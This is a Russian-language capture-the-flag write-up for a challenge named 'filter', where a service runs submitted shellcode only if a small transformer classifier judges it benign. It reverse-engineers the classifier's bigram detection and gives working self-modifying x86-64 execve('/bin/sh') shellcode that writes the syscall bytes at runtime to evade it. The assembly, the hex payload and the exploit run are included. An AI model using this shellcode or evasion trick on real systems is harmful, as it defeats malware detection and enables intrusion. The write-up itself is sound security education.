# Разбор: filter

## Что дано

TCP-сервис читает шелл-код и прогоняет его через крошечный байтовый
«трансформер»-фильтр. Код исполняется из RWX-буфера **только если** модель
посчитала его безвредным (score ≤ 0).

Протокол:

```
[4 байта длины little-endian][байты шелл-кода]     # длина ≤ 0x1000
```

## Фильтр

По `filter.c` + `model.h` модель — это один блок внимания:

```
x[i]    = E[byte[i]]                                  # эмбеддинг
s[i][j] = (Wq x[i])·(Wk x[j]) + relbias[i-j]          # каузальное окно, j in [i-W, i]
a[i]    = softmax(s[i])
ctx[i]  = Σ a[i][j] (Wv x[j])
h[i]    = relu(W1 · concat(x[i], ctx[i]) + b1)
logit[i]= w2 · h[i] + b2
score   = max_i logit[i]          # вредоносный, если score > 0
```

Если посмотреть на веса (или просто попробовать сервис), видно, что он
детектирует: эмбеддинг «загорается» только на байтах `0f, cd, 05, 80, 34`,
relative-position bias тянет внимание каждой позиции на **предыдущий** байт, а
FFN делает AND «предыдущий байт» и «текущий байт». В итоге срабатывает ровно на
трёх биграммах:

| биграмма | инструкция |
|--------|-------------|
| `0f 05` | `syscall` |
| `cd 80` | `int 0x80` |
| `0f 34` | `sysenter` |

Любой шелл-код, где такая биграмма есть буквально, получает score `+20` →
отклонён.

## Почему наивный шелл-код не проходит

На x86-64 вход в ядро — это одна из этих трёх инструкций, поэтому обычный
пейлоад `execve("/bin/sh")` всегда содержит `0f 05` и отклоняется:

```
[*] guard verdict: score = 20.000
[!] the transformer flagged your code as MALICIOUS. Denied.
```

## Обход

Буфер с кодом замаплен `PROT_READ|WRITE|EXEC`, то есть код может переписать сам
себя. Мы никогда не отправляем байты `0f 05`, а вместо этого:

1. кладём в поток два безобидных байта-заглушки (`90 90`, то есть `nop; nop`);
2. в рантайме пишем поверх них `0f` и затем `05` **двумя отдельными** записями,
   так что `0f` и `05` нигде в отправленном коде не стоят рядом;
3. проваливаемся исполнением в эти байты, которые теперь декодируются как
   `syscall`.

Статически модель видит там только `90 90`, ставит score `-10` и исполняет.

```asm
    lea r8, [rip + patch]
    mov byte ptr [r8],     0x0f     ; пишем первый байт
    mov byte ptr [r8 + 1], 0x05     ; пишем второй байт

    xor eax, eax
    push rax                        ; терминатор "/bin/sh\0"
    mov rbx, 0x68732f6e69622f2f     ; "//bin/sh"
    push rbx
    mov rdi, rsp
    xor esi, esi
    xor edx, edx
    mov al, 0x3b                    ; __NR_execve
patch:
    .byte 0x90, 0x90                ; -> в рантайме становится `syscall`
    hlt
```

Собранный пейлоад (42 байта) не содержит ни `0f 05`, ни `cd 80`, ни `0f 34`:

```
4c8d052000000041c6000f41c640010531c05048bb2f2f62696e2f7368534889e731f631d2b03b9090f4
```

Обрати внимание: две записи кодируются как `41 c6 00 0f` и `41 c6 40 01 05` —
`0f` и `05` в immediate оказываются с другими байтами между собой, так что
запрещённая биграмма нигде не появляется.

## Запуск

```sh
python3 solve/exploit.py <host> <port>
# [+] looks harmless to me. Executing...
# uid=...
# ctfcup{tr4nsformer_says_benign_...}
```

`solve/exploit.py` собирает пейлоад, проверяет, что он чист от биграмм, отправляет
шелл-код с префиксом длины, затем через тот же сокет гонит шелл на
`cat /flag.txt`.
